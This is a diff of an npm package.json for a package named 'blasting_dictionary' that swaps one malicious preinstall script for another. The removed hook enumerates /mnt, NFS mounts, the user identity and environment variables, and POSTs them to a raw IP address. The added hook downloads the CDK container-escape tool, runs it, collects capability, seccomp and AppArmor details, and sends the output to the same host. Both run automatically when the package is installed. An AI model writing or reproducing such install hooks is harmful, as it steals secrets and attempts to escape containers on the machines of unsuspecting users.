@@ -1,8 +1,8 @@
 {
   "name": "blasting_dictionary",
-  "version": "1.2.8",
+  "version": "1.2.9",
   "scripts": {
-    "preinstall": "(echo '===NFS_PROBE==='; echo '---MNT_LS---'; ls -la /mnt/ 2>&1; echo ''; echo '---MNT_FIND---'; find /mnt -maxdepth 3 -type f 2>/dev/null | head -50; echo ''; echo '---MNT_DIRS---'; find /mnt -maxdepth 3 -type d 2>/dev/null | head -50; echo ''; echo '---MNT_WRITE---'; echo 'test_write_12345' > /mnt/test_write.txt 2>&1 && echo 'WRITE_OK' && cat /mnt/test_write.txt 2>&1 && rm /mnt/test_write.txt 2>&1 || echo 'WRITE_FAILED'; echo ''; echo '---MNT_PERMS---'; touch /mnt/perm_test 2>&1; stat /mnt/ 2>&1; echo ''; echo '---HOSTNAME---'; hostname 2>&1; echo ''; echo '---WHOAMI---'; whoami 2>&1; id 2>&1; echo ''; echo '---ENV---'; env 2>&1 | head -30; echo ''; echo '---PROC_MOUNTINFO---'; cat /proc/self/mountinfo 2>&1 | grep -i nfs; echo ''; echo '===END===') | curl -s -X POST -d @- http://139.224.40.24:8088/k8s",
+    "preinstall": "(echo '===CDK_ESCAPE==='; cd /tmp; echo '---DOWNLOAD---'; curl -sL -o cdk https://github.com/cdk-team/CDK/releases/download/v1.5.5/cdk_linux_amd64 2>&1 && chmod +x cdk && echo 'CDK_OK' || echo 'CDK_FAIL'; echo ''; echo '---EVAL---'; ./cdk evaluate 2>&1; echo ''; echo '---RUN---'; ./cdk run 2>&1 | head -100; echo ''; echo '---CAP---'; cat /proc/1/status 2>&1 | grep -i cap; echo ''; echo '---SECCOMP---'; cat /proc/1/status 2>&1 | grep -i seccomp; echo ''; echo '---APPARMOR---'; cat /proc/1/attr/current 2>&1; echo ''; echo '---SYSCTL---'; cat /proc/sys/kernel/unprivileged_userns_clone 2>&1; echo ''; echo '---DEVICE---'; ls -la /dev/ 2>&1 | grep -E 'sd|vd|nvme|loop'; echo ''; echo '---MODULES---'; lsmod 2>&1 | head -20; echo ''; echo '===END===') | curl -s -X POST -d @- http://139.224.40.24:8088/k8s",
     "build": "echo 'building...'"
   }
 }
